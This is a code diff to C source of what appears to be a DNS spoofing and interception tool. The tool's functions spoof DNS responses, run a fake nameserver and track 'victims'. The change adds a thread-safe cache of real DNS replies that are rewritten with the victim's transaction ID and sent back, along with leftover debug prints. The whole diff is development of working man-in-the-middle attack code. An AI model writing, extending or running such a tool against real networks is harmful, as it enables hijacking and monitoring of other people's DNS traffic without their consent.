@@ -6,6 +6,7 @@
  *
  */
 #include "dnsspf.h"
+#include "ctxs.h"
 #include "udp.h"
 #include "ip.h"
 #include "arp.h"
@@ -16,6 +17,8 @@
 #include <stdio.h>
 #include <arpa/inet.h>
 #include <time.h>
+
+static pthread_mutex_t dnscaching_mtx = PTHREAD_MUTEX_INITIALIZER;
 
 static char last_name_resolved[0xff] = "";
 
@@ -107,7 +110,7 @@ static void dnsf_ckr_spoof_dns_response(struct dnsf_ckr_dns_header **dns, dnsf_c
     memcpy((*dns)->rscrecfmt.rdata, &hostname->addr, sizeof(hostname->addr));
 }
 
-dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, const unsigned char src_mac[6], char *domain_name, size_t domain_name_sz, dnsf_ckr_victims_ctx **victim, dnsf_ckr_hostnames_ctx **hostinfo, const int dnsspf_ttl) {
+dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, const unsigned char src_mac[6], char *domain_name, size_t domain_name_sz, dnsf_ckr_victims_ctx **victim, dnsf_ckr_hostnames_ctx **hostinfo, const int dnsspf_ttl, dnsf_ckr_dnsresolvcache_ctx **dnscache, const int cache_size) {
     struct dnsf_ckr_ip_header *ip = NULL;
     struct dnsf_ckr_udp_header *udp = NULL;
     struct dnsf_ckr_ethernet_frame eth;
@@ -119,6 +122,7 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
     unsigned short temp_port;
     unsigned long temp_addr;
     size_t rawpktsz;
+    dnsf_ckr_dnsresolvcache_ctx *cache_entry = NULL;
     dnsf_ckr_action_t action = dnsf_ckr_action_none;
     if (domain_name != NULL) {
         memset(domain_name, 0, domain_name_sz);
@@ -220,7 +224,23 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
                             //  and so repass it to the "victim".
                             free(udp->payload);
                             udp->len -= udp->payload_size;
-                            udp->payload = dnsf_ckr_mk_dnsresponse(&udp->payload_size, udp->payload, udp->payload_size, ip->dest);
+                            pthread_mutex_lock(&dnscaching_mtx);
+                            if ((cache_entry = get_dnsf_ckr_dnsresolvcache_ctx_dname(hostname, *dnscache)) == NULL) {
+                                udp->payload = dnsf_ckr_mk_dnsresponse(&udp->payload_size, udp->payload, udp->payload_size, ip->dest);
+                                if (udp->payload_size > 0) {
+                                    *dnscache = push_resolution_to_dnsf_ckr_dnsresolvcache_ctx(dnscache, (size_t)cache_size, hostname, strlen(hostname), udp->payload, (size_t)udp->payload_size);
+                                    printf("ADDED %s %d\n", (*dnscache)->dname, udp->payload_size);
+                                }
+                            } else {
+                                udp->payload = (unsigned char *) dnsf_ckr_getmemory(cache_entry->reply_size);
+                                udp->payload_size = cache_entry->reply_size;
+                                udp->payload[0] = (dns->id >> 8);
+                                udp->payload[1] = (dns->id & 0x00ff);
+                                printf("%d\n", cache_entry->reply_size - 2);
+                                memcpy(&udp->payload[2], &cache_entry->reply[2], cache_entry->reply_size - 2);
+                                printf("READ FROM CACHE ;)\n");
+                            }
+                            pthread_mutex_unlock(&dnscaching_mtx);
                             udp->len += udp->payload_size;
                             temp_port = udp->src;
                             udp->src = udp->dest;
